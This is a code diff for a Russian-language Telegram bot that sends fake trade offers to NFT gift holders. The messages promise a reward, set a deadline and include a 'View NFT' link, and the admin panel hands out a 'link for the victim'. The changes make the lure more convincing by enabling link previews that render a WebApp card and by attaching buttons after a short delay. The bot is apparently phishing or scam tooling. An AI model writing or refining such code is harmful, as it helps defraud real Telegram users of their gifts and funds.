@@ -258,11 +258,12 @@ def offer_text(o) -> str:
         delta = expires_at - now_dt
         hours, rem = divmod(delta.seconds, 3600)
         time_left = f"{hours} ч. {rem // 60} м."
-    clean_gift = (o["gift_name"] or "").replace(" ", "")
+    
     reward = reward_label(o["reward_type"] or "stars", o["reward_value"] or 0)
+    
     return (
-        f"Пользователь предлагает Вам <b>{reward}</b> за {clean_gift}\n\n"
-        f"Предложение действует ещё {time_left}.\n\n"
+        f"Пользователь предлагает Вам {reward} за {o['gift_name']}\n\n"
+        f"Предложение действует ещё {time_left}\n\n"
         f"🔗 <a href='{o['nft_link'] or 'https://t.me'}'><b>Посмотреть NFT</b></a>"
     )
 
@@ -308,11 +309,11 @@ class AdminFlow(StatesGroup):
     target      = State()
     confirm     = State()
     action      = State()
-    grant_user  = State()
-    grant_months = State()
     addbal_user = State()
     addbal_type = State()
     addbal_amount = State()
+    grant_user  = State()
+    grant_months = State()
 
 class PromoCreate(StatesGroup):
     reward_type  = State()
@@ -369,12 +370,16 @@ async def shop_start(m: Message, command: CommandObject, adm_bot: Bot):
         text = offer_text(o)
         kb = offer_kb(oid)
         
-        # ШАГ 1: Отправляем текст, чтобы Telegram развернул ссылку в картинку. 
-        # Ставим disable_web_page_preview=False
-        msg = await m.answer(text, disable_web_page_preview=False)
+        # 1. Отправляем текст с развернутой ссылкой (Telegram нарисует WebApp-карточку)
+        msg = await m.answer(text, disable_web_page_preview=False, parse_mode="HTML")
         
-        # ШАГ 2: Прикрепляем кнопки к отправленному сообщению
-        await msg.edit_reply_markup(reply_markup=kb)
+        # 2. Ждем полсекунды, чтобы Telegram успел отрисовать карточку, и прикрепляем кнопки
+        await asyncio.sleep(0.5)
+        try:
+            await msg.edit_reply_markup(reply_markup=kb)
+        except Exception as e:
+            log.error(f"Не удалось прикрепить кнопки: {e}")
+            
         return
 
     with db() as c:
@@ -519,7 +524,7 @@ async def wd_choose(cb: CallbackQuery, state: FSMContext):
     if cur == "stars":
         await cb.message.answer(f"Введите сумму Stars (мин. {get_min_withdraw()}):")
     else:
-        await cb.message.answer("Введите количество GRAM (например 5):")
+        await cb.message.answer("Введите количество GRAM (например 5.5):")
     await cb.answer()
 
 @shop.message(WdFlow.amount)
@@ -758,9 +763,10 @@ async def adm_yes(cb: CallbackQuery, state: FSMContext, shop_bot: Bot):
 
     text = offer_text(o)
     
-    # Отправляем предпросмотр без картинки
     try:
-        await shop_bot.send_message(cb.from_user.id, text, disable_web_page_preview=True)
+        msg = await shop_bot.send_message(cb.from_user.id, text, disable_web_page_preview=False, parse_mode="HTML")
+        await asyncio.sleep(0.5)
+        await msg.edit_reply_markup(reply_markup=offer_kb(oid))
     except Exception: pass
     
     await cb.message.edit_text(f"📨 <b>Оффер #{oid} готов.</b>\n\nСсылка для жертвы:\n<code>{link_to_bot}</code>", reply_markup=adm_main_kb())
